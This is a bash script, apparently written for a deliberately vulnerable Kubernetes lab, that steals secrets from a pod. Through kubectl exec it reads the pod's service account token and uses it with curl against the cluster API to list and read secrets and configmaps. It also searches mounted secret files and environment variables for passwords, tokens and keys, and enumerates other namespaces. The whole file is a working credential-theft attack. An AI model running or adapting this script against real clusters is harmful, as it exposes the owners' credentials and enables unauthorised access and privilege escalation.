#!/bin/bash

# Script to exfiltrate secrets and configmaps from the cluster
# Attempts to access Kubernetes secrets and configmaps

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
POD_NAME="${2:-}"

if [ -z "$POD_NAME" ]; then
    echo -e "${YELLOW}Usage: $0 <namespace> <pod-name>${NC}"
    exit 1
fi

echo -e "${BLUE}=== Secrets Exfiltration ===${NC}"
echo -e "${GREEN}Pod: $POD_NAME${NC}"
echo -e "${GREEN}Namespace: $NAMESPACE${NC}\n"

# Check for service account token
echo -e "${YELLOW}[1] Checking service account access...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo '✓ Service account token found'
        TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        NAMESPACE=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
        CA=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
        echo \"Namespace: \$NAMESPACE\"
    else
        echo '✗ No service account token found'
        exit 1
    fi
" || {
    echo -e "${RED}No service account access${NC}"
    exit 1
}

# List secrets in namespace
echo -e "\n${YELLOW}[2] Listing secrets in namespace...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    NAMESPACE=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    
    echo 'Secrets:' && \
    curl -k -s -H \"Authorization: Bearer \$TOKEN\" \
        --cacert \$CA \
        https://kubernetes.default.svc/api/v1/namespaces/\$NAMESPACE/secrets 2>/dev/null | \
        grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | head -10 || \
    echo 'Could not list secrets'
"

# List configmaps
echo -e "\n${YELLOW}[3] Listing configmaps...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    NAMESPACE=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    
    echo 'ConfigMaps:' && \
    curl -k -s -H \"Authorization: Bearer \$TOKEN\" \
        --cacert \$CA \
        https://kubernetes.default.svc/api/v1/namespaces/\$NAMESPACE/configmaps 2>/dev/null | \
        grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | head -10 || \
    echo 'Could not list configmaps'
"

# Try to read specific secrets
echo -e "\n${YELLOW}[4] Attempting to read secrets...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    NAMESPACE=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    
    for secret in \$(kubectl get secrets -n \$NAMESPACE -o jsonpath='{.items[*].metadata.name}' 2>/dev/null | tr ' ' '\n' | head -5); do
        echo \"=== Secret: \$secret ===\"
        curl -k -s -H \"Authorization: Bearer \$TOKEN\" \
            --cacert \$CA \
            https://kubernetes.default.svc/api/v1/namespaces/\$NAMESPACE/secrets/\$secret 2>/dev/null | \
            grep -o '\"data\":{[^}]*}' | head -1 || \
        echo \"Could not read secret\"
        echo ''
    done
"

# Check mounted secrets
echo -e "\n${YELLOW}[5] Checking mounted secrets...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'Mounted secrets:' && \
    mount | grep secret || echo 'No secrets mounted' && \
    echo '' && \
    echo 'Secret files:' && \
    find /var/run/secrets -type f 2>/dev/null | head -10 || echo 'No secrets directory'
"

# Check environment variables for secrets
echo -e "\n${YELLOW}[6] Checking environment for secrets...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    echo 'Environment variables with secret-like names:' && \
    env | grep -iE 'secret|password|token|key|credential|api[_-]?key' | head -20 || \
    echo 'No obvious secrets in environment'
"

# Try to access other namespaces
echo -e "\n${YELLOW}[7] Attempting to access other namespaces...${NC}"
kubectl exec -n "$NAMESPACE" "$POD_NAME" -- sh -c "
    TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    
    echo 'Listing namespaces:' && \
    curl -k -s -H \"Authorization: Bearer \$TOKEN\" \
        --cacert \$CA \
        https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | \
        grep -o '\"name\":\"[^\"]*\"' | cut -d'\"' -f4 | head -10 || \
    echo 'Could not list namespaces'
"

echo -e "\n${GREEN}=== Secrets Exfiltration Complete ===${NC}"

